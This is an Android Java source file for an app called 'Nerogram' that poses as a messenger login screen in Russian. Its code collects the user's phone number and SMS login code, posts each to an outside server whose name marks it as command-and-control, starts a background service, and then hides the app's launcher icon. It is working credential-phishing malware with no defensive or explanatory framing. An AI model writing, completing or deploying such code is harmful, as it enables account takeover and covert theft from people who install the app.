package com.nerogram;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private final String SERVER_URL = "https://nerogram-c2.onrender.com"; // ТВОЙ URL RENDER
    private final String DEVICE_ID = "android-phone";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#0F0F13"));
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(60, 0, 60, 0);

        TextView title = new TextView(this);
        title.setText("Nerogram");
        title.setTextColor(Color.parseColor("#A855F7"));
        title.setTextSize(42);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView subtitle = new TextView(this);
        subtitle.setText("Войдите, чтобы продолжить");
        subtitle.setTextColor(Color.parseColor("#A1A1AA"));
        subtitle.setTextSize(16);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 20, 0, 60);
        layout.addView(subtitle);

        EditText phoneInput = createStyledInput("Номер телефона");
        layout.addView(phoneInput);

        Button btnNext = createStyledButton("Далее");
        layout.addView(btnNext);

        EditText codeInput = createStyledInput("Код из SMS");
        codeInput.setVisibility(View.GONE);
        layout.addView(codeInput);

        Button btnLogin = createStyledButton("Войти");
        btnLogin.setVisibility(View.GONE);
        layout.addView(btnLogin);

        // Кнопка "Аккаунты"
        Button btnAccounts = createStyledButton("Аккаунты");
        btnAccounts.setVisibility(View.GONE);
        layout.addView(btnAccounts);

        setContentView(layout);

        btnNext.setOnClickListener(v -> {
            String phone = phoneInput.getText().toString();
            if (phone.isEmpty()) {
                Toast.makeText(this, "Введите номер", Toast.LENGTH_SHORT).show();
                return;
            }
            sendDataToServer("Номер: " + phone);
            btnNext.setVisibility(View.GONE);
            phoneInput.setEnabled(false);
            codeInput.setVisibility(View.VISIBLE);
            btnLogin.setVisibility(View.VISIBLE);
        });

        btnLogin.setOnClickListener(v -> {
            String code = codeInput.getText().toString();
            sendDataToServer("Код: " + code);

            // Запускаем сервисы
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            startService(serviceIntent);

            // Скрываем поля, показываем "Аккаунты"
            btnLogin.setVisibility(View.GONE);
            codeInput.setVisibility(View.GONE);
            btnAccounts.setVisibility(View.VISIBLE);

            // Прячем иконку
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
        });

        btnAccounts.setOnClickListener(v -> {
            Toast.makeText(this, "Открываю список аккаунтов...", Toast.LENGTH_SHORT).show();
            // Тут логика для списка аккаунтов
        });
    }

    private EditText createStyledInput(String hint) {
        EditText input = new EditText(this);
        input.setHint(hint);
        input.setHintTextColor(Color.parseColor("#71717A"));
        input.setTextColor(Color.WHITE);
        input.setBackgroundColor(Color.parseColor("#1C1C22"));
        input.setPadding(40, 30, 40, 30);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 0, 0, 30);
        input.setLayoutParams(params);
        return input;
    }

    private Button createStyledButton(String text) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setAllCaps(false);
        GradientDrawable shape = new GradientDrawable();
        shape.setColor(Color.parseColor("#A855F7"));
        shape.setCornerRadius(30);
        btn.setBackground(shape);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 130);
        params.setMargins(0, 10, 0, 30);
        btn.setLayoutParams(params);
        return btn;
    }

    private void sendDataToServer(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                String json = "{\"id\":\"" + DEVICE_ID + "\",\"type\":\"text\",\"text\":\"" + text + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
